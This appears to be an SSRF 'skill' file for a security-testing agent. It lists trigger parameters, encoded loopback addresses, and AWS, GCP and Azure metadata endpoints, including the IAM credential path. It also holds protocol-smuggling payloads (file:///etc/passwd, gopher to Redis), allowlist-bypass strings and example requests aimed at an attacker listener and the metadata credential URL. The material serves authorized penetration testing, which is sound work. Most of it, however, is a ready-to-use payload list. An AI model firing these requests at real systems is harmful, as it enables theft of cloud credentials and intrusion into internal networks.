---
repro: technique-authored
---

# SKILL: ssrf
## Trigger Params
webhook_url, callback, import_from, avatar_url, url, file, image_url, next, redirect, preview, PDF/HTML render
## Internal
http://localhost
http://127.0.0.1
http://0x7f000001
http://2130706433
http://[::]
http://127.0.0.1.nip.io
http://[::ffff:7f00:1]/
## Cloud metadata
AWS: http://169.254.169.254/latest/meta-data/
AWS role: http://169.254.169.254//latest/meta-data/iam/security-credentials/
GCP: http://metadata.google.internal/computeMetadata/v1/ + header Metadata-Flavor: Google
Azure: http://169.254.169.254/metadata/identity/oauth2/token
## Protocol smuggling
file:///etc/passwd
gopher://127.0.0.1:6379/_PING
dict://
sftp://
ldap://
## Whitelist bypass
0://collab;target.com
0://collab:80;target.com:80
0://collab:80,target.com:80
0://evil$target.com
compress.zlib://target.com/../../../../etc/passwd
data://target.com/plain;base64,VHVoaW4=
http://google.com:11211:80/
## Triage
Metadata → Critical. Internal scan → High. Callback → Med.

## Steps to reproduce


> Status: `repro: technique-authored` — authored and reviewed for correctness against the SSRF class. Not executed against a live host; live confirmation needs an in-scope target.


### Preconditions
- An endpoint fetches a URL supplied by the user server-side (see `## Trigger Params`: `url`, `webhook_url`, `callback`, `image_url`, `import_from`, PDF/HTML render inputs).
- You control an external listener/collaborator host that logs inbound requests (for out-of-band confirmation).


### Steps
1. Point the parameter at a unique attacker-controlled URL and confirm the server (not your browser) makes the request by watching your listener.
2. Then pivot the parameter to an internal/metadata target and capture the response or its side effects.


Example request (placeholder host `TARGET`, listener `oob.attacker.example`):
```
POST /api/fetch HTTP/1.1 Host: TARGET Content-Type: application/json


{"url":"http://oob.attacker.example/ssrf-<UNIQUE_TOKEN>"}


```
Internal/metadata pivot (AWS IMDSv1 example):
```
POST /api/fetch HTTP/1.1 Host: TARGET Content-Type: application/json


{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}


```
### Success condition (machine-checkable)
- Out-of-band: your listener logs an inbound HTTP request for the exact `<UNIQUE_TOKEN>` path, originating from the target's egress IP (not your test client) — proves server-side fetch.
- In-band: the API response body contains data only reachable from inside the target's network — e.g. the IMDS path returns an IAM role name / credential JSON, or an internal-only service banner. Either signal confirms SSRF.


### False-positive guard
- NOT SSRF if the request to your listener comes from the client/browser IP (that is client-side redirect/fetch), if the server only validates the URL without fetching (no listener hit), or if the endpoint returns a canned error for non-allowlisted hosts. A 200 with an empty/error body and no listener hit and no internal data is not confirmation.
